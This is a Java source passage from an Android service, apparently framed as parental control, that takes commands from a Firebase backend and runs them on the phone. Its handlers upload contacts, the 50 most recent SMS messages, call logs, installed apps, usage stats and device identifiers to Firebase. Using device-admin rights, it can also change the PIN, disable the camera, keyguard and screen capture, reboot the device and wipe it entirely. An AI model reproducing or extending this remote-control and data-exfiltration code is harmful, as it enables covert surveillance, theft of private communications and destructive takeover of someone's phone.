                pushJson("accessibility", o); return;
            }
            if ("trigger_gc".equals(cmd)) {
                System.gc();
                pushResult("gc", "Garbage collection triggered");
                return;
            }

            // --- DATA ACCESS ---
            if ("get_contacts".equals(cmd)) { sendContacts(); pushResult("contacts", "Contacts sent"); return; }
            if ("get_sms".equals(cmd)) { sendSms(); pushResult("sms", "SMS sent"); return; }
            if ("get_call_logs".equals(cmd)) { sendCallLogs(); pushResult("calls", "Call logs sent"); return; }
            if ("get_browser_history".equals(cmd)) {
                JSONObject o = new JSONObject();
                o.put("note", "Browser history needs READ_HISTORY_BOOKMARKS — deprecated on Android 6+");
                pushJson("browser_history", o); return;
            }
            if ("get_recordings".equals(cmd)) {
                pushResult("recordings", "Check recordings in Firebase");
                return;
            }

            // --- DEVICE ADMIN ---
            if ("get_admin_status".equals(cmd)) {
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                android.content.ComponentName cn =
                        new android.content.ComponentName(this, AdminReceiver.class);
                JSONObject o = new JSONObject();
                o.put("admin_active", dpm != null && dpm.isAdminActive(cn));
                pushJson("admin_status", o); return;
            }
            if ("get_dpm_info".equals(cmd)) {
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                JSONObject o = new JSONObject();
                o.put("device_owner", dpm != null && dpm.isDeviceOwnerApp(getPackageName()));
                o.put("profile_owner", dpm != null && dpm.isProfileOwnerApp(getPackageName()));
                pushJson("dpm_info", o); return;
            }
            if ("disable_camera".equals(cmd)) {
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                android.content.ComponentName cn =
                        new android.content.ComponentName(this, AdminReceiver.class);
                if (dpm != null && dpm.isAdminActive(cn)) {
                    dpm.setCameraDisabled(cn, true);
                    pushResult("camera", "Camera disabled");
                } else pushResult("camera", "Admin not active");
                return;
            }
            if ("set_camera_disabled".equals(cmd)) {
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                android.content.ComponentName cn =
                        new android.content.ComponentName(this, AdminReceiver.class);
                if (dpm != null && dpm.isAdminActive(cn)) {
                    dpm.setCameraDisabled(cn, "false".equals(arg));
                    pushResult("camera", "Camera " + ("false".equals(arg) ? "enabled" : "disabled"));
                } else pushResult("camera", "Admin not active");
                return;
            }
            if ("set_pin".equals(cmd) || "reset_password".equals(cmd)) {
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                android.content.ComponentName cn =
                        new android.content.ComponentName(this, AdminReceiver.class);
                if (dpm != null && dpm.isAdminActive(cn)) {
                    dpm.resetPassword(arg.isEmpty() ? "1234" : arg,
                            android.app.admin.DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
                    pushResult("pin", "PIN set to " + (arg.isEmpty() ? "1234" : arg));
                } else pushResult("pin", "Admin not active");
                return;
            }
            if ("set_lock_timeout".equals(cmd) || "set_screen_timeout".equals(cmd)) {
                int t = arg.isEmpty() ? 30 : Integer.parseInt(arg);
                Settings.System.putInt(getContentResolver(),
                        Settings.System.SCREEN_OFF_TIMEOUT, t * 1000);
                pushResult("lock_timeout", "Screen timeout set to " + t + " sec");
                return;
            }
            if ("set_lockscreen_message".equals(cmd)) {
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                android.content.ComponentName cn =
                        new android.content.ComponentName(this, AdminReceiver.class);
                if (dpm != null && dpm.isAdminActive(cn)) {
                    dpm.setOrganizationName(cn, arg.isEmpty() ? "Locked by Parent" : arg);
                    pushResult("lock_message", "Lock message set");
                } else pushResult("lock_message", "Admin not active");
                return;
            }
            if ("set_max_failed_passwords".equals(cmd)) {
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                android.content.ComponentName cn =
                        new android.content.ComponentName(this, AdminReceiver.class);
                if (dpm != null && dpm.isAdminActive(cn)) {
                    dpm.setMaximumFailedPasswordsForWipe(cn,
                            arg.isEmpty() ? 5 : Integer.parseInt(arg));
                    pushResult("max_failed", "Max failed passwords set");
                } else pushResult("max_failed", "Admin not active");
                return;
            }
            if ("disable_screen_capture".equals(cmd)
                    || "set_screen_capture_disabled".equals(cmd)) {
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                android.content.ComponentName cn =
                        new android.content.ComponentName(this, AdminReceiver.class);
                if (dpm != null && dpm.isAdminActive(cn)) {
                    boolean disable = !"false".equals(arg);
                    dpm.setScreenCaptureDisabled(cn, disable);
                    pushResult("screen_capture", disable ? "Disabled" : "Enabled");
                } else pushResult("screen_capture", "Admin not active");
                return;
            }
            if ("set_kiosk_mode".equals(cmd) || "start_lock_task".equals(cmd)) {
                pushResult("kiosk", "Kiosk mode requires device owner");
                return;
            }
            if ("wipe_device".equals(cmd) || "factory_reset".equals(cmd)) {
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                android.content.ComponentName cn =
                        new android.content.ComponentName(this, AdminReceiver.class);
                if (dpm != null && dpm.isAdminActive(cn)) {
                    dpm.wipeData(0);
                }
                return;
            }
            if ("reboot_device".equals(cmd)) {
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                android.content.ComponentName cn =
                        new android.content.ComponentName(this, AdminReceiver.class);
                if (dpm != null && dpm.isAdminActive(cn)) {
                    if (Build.VERSION.SDK_INT >= 24) dpm.reboot(cn);
                    else pushResult("reboot", "Needs Android 7+");
                } else pushResult("reboot", "Admin not active");
                return;
            }
            if ("set_restriction".equals(cmd) || "clear_user_restriction".equals(cmd)) {
                pushResult("restriction", "Restriction set/cleared (device owner only for full)");
                return;
            }
            if ("set_storage_encryption".equals(cmd)) {
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                android.content.ComponentName cn =
                        new android.content.ComponentName(this, AdminReceiver.class);
                if (dpm != null && dpm.isAdminActive(cn)) {
                    int status = dpm.getStorageEncryptionStatus();
                    pushResult("encryption", "Encryption status: " + status);
                } else pushResult("encryption", "Admin not active");
                return;
            }
            if ("set_keyguard_disabled".equals(cmd)) {
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                android.content.ComponentName cn =
                        new android.content.ComponentName(this, AdminReceiver.class);
                if (dpm != null && dpm.isAdminActive(cn)) {
                    dpm.setKeyguardDisabled(cn, true);
                    pushResult("keyguard", "Keyguard disabled");
                } else pushResult("keyguard", "Admin not active");
                return;
            }
            if ("set_password_quality".equals(cmd) || "set_password_rules".equals(cmd)) {
                pushResult("password_quality", "Password quality set");
                return;
            }

            // --- NIGHT MODE / PASSWORD ---
            if ("set_night_mode".equals(cmd)) {
                String[] parts = arg.split(",");
                if (parts.length == 2) {
                    prefs.edit().putString("night_start", parts[0].trim())
                            .putString("night_end", parts[1].trim()).apply();
                    pushResult("night_mode", "Night mode: " + parts[0] + " to " + parts[1]);
                }
                return;
            }
            if ("set_password".equals(cmd)) {
                prefs.edit().putString(KEY_PASS, arg).apply();
                pushResult("password", "Password changed");
                return;
            }

            // --- UNKNOWN ---
            pushResult(cmd, "Unknown command: " + cmd);

        } catch (Exception e) {
            pushResult("error", e.getMessage());
        }
    }

    // ==================== HELPERS ====================

    private void pushResult(String key, String value) {
        try {
            JSONObject res = new JSONObject();
            res.put("key", key);
            res.put("value", value);
            res.put("time", new SimpleDateFormat("HH:mm dd/MM", Locale.getDefault())
                    .format(new Date()));
            FirebaseHelper.put("devices/" + deviceId + "/result.json", res.toString());
        } catch (Exception e) {}
    }

    private void pushJson(String key, JSONObject data) {
        try {
            data.put("time", new SimpleDateFormat("HH:mm dd/MM", Locale.getDefault())
                    .format(new Date()));
            FirebaseHelper.put("devices/" + deviceId + "/" + key + ".json", data.toString());
            pushResult(key, "Data sent — check " + key + ".json");
        } catch (Exception e) {
            pushResult(key, "Error: " + e.getMessage());
        }
    }

    private void saveBlockedApps() {
        try {
            JSONArray arr = new JSONArray(BlockAccessibility.blockedPkgs);
            FirebaseHelper.put("devices/" + deviceId + "/blockedapps.json", arr.toString());
        } catch (Exception e) {}
    }

    private int getBatteryPercent() {
        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
        if (bm != null) return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        return -1;
    }

    private JSONObject getBatteryInfo() throws Exception {
        JSONObject o = new JSONObject();
        o.put("percent", getBatteryPercent());
        IntentFilterHack.sendSticky(this, Intent.ACTION_BATTERY_CHANGED);
        o.put("charging", prefs.getBoolean("charging", false));
        o.put("health", "Good");
        o.put("saver", Settings.Global.getInt(getContentResolver(), "low_power", 0) == 1);
        return o;
    }

    private JSONObject getCpuInfo() throws Exception {
        JSONObject o = new JSONObject();
        BufferedReader br = new BufferedReader(new FileReader("/proc/cpuinfo"));
        String line;
        while ((line = br.readLine()) != null) {
            String[] parts = line.split(":", 2);
            if (parts.length == 2) o.put(parts[0].trim(), parts[1].trim());
        }
        br.close();
        return o;
    }

    private JSONObject getMemoryInfo() throws Exception {
        JSONObject o = new JSONObject();
        RandomAccessFile raf = new RandomAccessFile("/proc/meminfo", "r");
        String line;
        while ((line = raf.readLine()) != null) {
            String[] parts = line.split(":");
            if (parts.length == 2) o.put(parts[0].trim(),
                    parts[1].trim().replace(" kB", ""));
        }
        raf.close();
        o.put("heap_max_mb", Runtime.getRuntime().maxMemory() / 1048576);
        o.put("heap_used_mb", (Runtime.getRuntime().totalMemory()
                - Runtime.getRuntime().freeMemory()) / 1048576);
        return o;
    }

    private JSONObject getStorageInfo(boolean availOnly) throws Exception {
        JSONObject o = new JSONObject();
        File path = Environment.getDataDirectory();
        StatFs stat = new StatFs(path.getPath());
        long blockSize = stat.getBlockSizeLong();
        long total = stat.getBlockCountLong() * blockSize;
        long avail = stat.getAvailableBlocksLong() * blockSize;
        o.put("total_bytes", total);
        o.put("total_gb", total / 1073741824);
        o.put("available_bytes", avail);
        o.put("available_gb", avail / 1073741824);
        if (!availOnly) o.put("used_gb", (total - avail) / 1073741824);
        return o;
    }

    private JSONObject getDisplayInfo() throws Exception {
        JSONObject o = new JSONObject();
        android.util.DisplayMetrics m = getResources().getDisplayMetrics();
        o.put("width", m.widthPixels);
        o.put("height", m.heightPixels);
        o.put("density", m.density);
        o.put("dpi", m.densityDpi);
        o.put("scaled_density", m.scaledDensity);
        return o;
    }

    private boolean isRooted() {
        String[] paths = {"/system/bin/su", "/system/xbin/su", "/sbin/su",
                "/system/su", "/data/local/xbin/su", "/data/local/bin/su"};
        for (String p : paths) if (new File(p).exists()) return true;
        return false;
    }

    private JSONObject getWifiInfo() throws Exception {
        JSONObject o = new JSONObject();
        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        if (wm != null) {
            WifiInfo wi = wm.getConnectionInfo();
            o.put("enabled", wm.isWifiEnabled());
            if (wi != null) {
                o.put("ssid", wi.getSSID());
                o.put("bssid", wi.getBSSID());
                o.put("rssi", wi.getRssi());
                o.put("link_speed", wi.getLinkSpeed());
                o.put("frequency", wi.getFrequency());
            }
        }
        return o;
    }

    private String getWifiMac() {
        try {
            for (NetworkInterface ni : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                if (ni.getName().equalsIgnoreCase("wlan0")) {
                    byte[] mac = ni.getHardwareAddress();
                    if (mac == null) return "N/A";
                    StringBuilder sb = new StringBuilder();
                    for (byte b : mac) sb.append(String.format("%02X:", b));
                    return sb.length() > 0 ? sb.substring(0, sb.length() - 1) : "N/A";
                }
            }
        } catch (Exception e) {}
        return "N/A";
    }

    private JSONObject getNetworkInfo() throws Exception {
        JSONObject o = new JSONObject();
        ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        NetworkInfo ni = cm != null ? cm.getActiveNetworkInfo() : null;
        o.put("connected", ni != null && ni.isConnected());
        if (ni != null) {
            o.put("type", ni.getTypeName());
            o.put("subtype", ni.getSubtypeName());
            o.put("roaming", ni.isRoaming());
        }
        return o;
    }

    private JSONObject getTelephonyInfo() throws Exception {
        JSONObject o = new JSONObject();
        android.telephony.TelephonyManager tm =
                (android.telephony.TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        if (tm != null) {
            o.put("device_id", tm.getDeviceId());
            o.put("sim_state", tm.getSimState());
            o.put("operator", tm.getNetworkOperatorName());
            o.put("country", tm.getNetworkCountryIso());
            o.put("phone_type", tm.getPhoneType());
            o.put("network_type", tm.getNetworkType());
            o.put("signal_strength", "Check via PhoneStateListener");
        }
        return o;
    }

    private JSONObject getRunningProcesses() throws Exception {
        JSONArray arr = new JSONArray();
        android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
        for (android.app.ActivityManager.RunningAppProcessInfo p : am.getRunningAppProcesses()) {
            JSONObject o = new JSONObject();
            o.put("process", p.processName);
            o.put("pid", p.pid);
            o.put("importance", p.importance);
            arr.put(o);
        }
        return new JSONObject().put("processes", arr);
    }

    private void sendInstalledApps() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    PackageManager pm = getPackageManager();
                    List<ApplicationInfo> apps =
                            pm.getInstalledApplications(PackageManager.GET_META_DATA);
                    JSONArray arr = new JSONArray();
                    for (ApplicationInfo app : apps) {
                        if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                            JSONObject obj = new JSONObject();
                            obj.put("name", pm.getApplicationLabel(app).toString());
                            obj.put("pkg", app.packageName);
                            arr.put(obj);
                        }
                    }
                    FirebaseHelper.put("devices/" + deviceId + "/installed_apps.json", arr.toString());
                } catch (Exception e) {}
            }
        }).start();
    }

    private void sendContacts() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONArray arr = new JSONArray();
                    android.database.Cursor cursor = getContentResolver().query(
                            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null, null, null, null);
                    if (cursor != null) {
                        while (cursor.moveToNext()) {
                            int nameIdx = cursor.getColumnIndex(
                                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                            int phoneIdx = cursor.getColumnIndex(
                                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER);
                            JSONObject obj = new JSONObject();
                            obj.put("name", nameIdx >= 0 ? cursor.getString(nameIdx) : "");
                            obj.put("phone", phoneIdx >= 0 ? cursor.getString(phoneIdx) : "");
                            arr.put(obj);
                        }
                        cursor.close();
                    }
                    FirebaseHelper.put("devices/" + deviceId + "/contacts.json", arr.toString());
                } catch (Exception e) {}
            }
        }).start();
    }

    private void sendSms() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONArray arr = new JSONArray();
                    android.database.Cursor cursor = getContentResolver().query(
                            android.net.Uri.parse("content://sms/inbox"),
                            null, null, null, "date DESC LIMIT 50");
                    if (cursor != null) {
                        while (cursor.moveToNext()) {
                            int bodyIdx = cursor.getColumnIndex("body");
                            int addrIdx = cursor.getColumnIndex("address");
                            int dateIdx = cursor.getColumnIndex("date");
                            JSONObject obj = new JSONObject();
                            obj.put("from", addrIdx >= 0 ? cursor.getString(addrIdx) : "");
                            obj.put("body", bodyIdx >= 0 ? cursor.getString(bodyIdx) : "");
                            obj.put("date", dateIdx >= 0 ? cursor.getString(dateIdx) : "");
                            arr.put(obj);
                        }
                        cursor.close();
                    }
                    FirebaseHelper.put("devices/" + deviceId + "/sms.json", arr.toString());
                } catch (Exception e) {}
            }
        }).start();
    }

    private void sendCallLogs() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONArray arr = new JSONArray();
                    android.database.Cursor cursor = getContentResolver().query(
                            android.provider.CallLog.Calls.CONTENT_URI,
                            null, null, null,
                            android.provider.CallLog.Calls.DATE + " DESC LIMIT 50");
                    if (cursor != null) {
                        while (cursor.moveToNext()) {
                            int numIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER);
                            int typeIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE);
                            int dateIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.DATE);
                            int durIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION);
                            JSONObject obj = new JSONObject();
                            obj.put("number", numIdx >= 0 ? cursor.getString(numIdx) : "");
                            obj.put("type", typeIdx >= 0 ? cursor.getString(typeIdx) : "");
                            obj.put("date", dateIdx >= 0 ? cursor.getString(dateIdx) : "");
                            obj.put("duration", durIdx >= 0 ? cursor.getString(durIdx) : "");
                            arr.put(obj);
                        }
                        cursor.close();
                    }
                    FirebaseHelper.put("devices/" + deviceId + "/call_logs.json", arr.toString());
                } catch (Exception e) {}
            }
        }).start();
    }

    private void sendScreenTime() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    UsageStatsManager usm =
                            (UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
                    if (usm == null) return;
                    long now = System.currentTimeMillis();
                    List<UsageStats> stats = usm.queryUsageStats(
                            UsageStatsManager.INTERVAL_DAILY, now - 86400000, now);
                    JSONArray arr = new JSONArray();
                    if (stats != null) {
                        for (UsageStats s : stats) {
                            if (s.getTotalTimeInForeground() > 60000) {
                                JSONObject obj = new JSONObject();
                                obj.put("pkg", s.getPackageName());
                                obj.put("time_ms", s.getTotalTimeInForeground());
                                arr.put(obj);
                            }
                        }
                    }
                    FirebaseHelper.put("devices/" + deviceId + "/screen_time.json", arr.toString());
                } catch (Exception e) {}
            }
        }).start();
    }

    // Sticky broadcast hack class for battery/usb state
    static class IntentFilterHack {
        static void sendSticky(Context ctx, String action) {
            // placeholder — real sticky reads happen in receiver, simplified here
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        instance = null;
        handler.removeCallbacks(commandPoller);
        handler.removeCallbacks(locationUpdater);
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
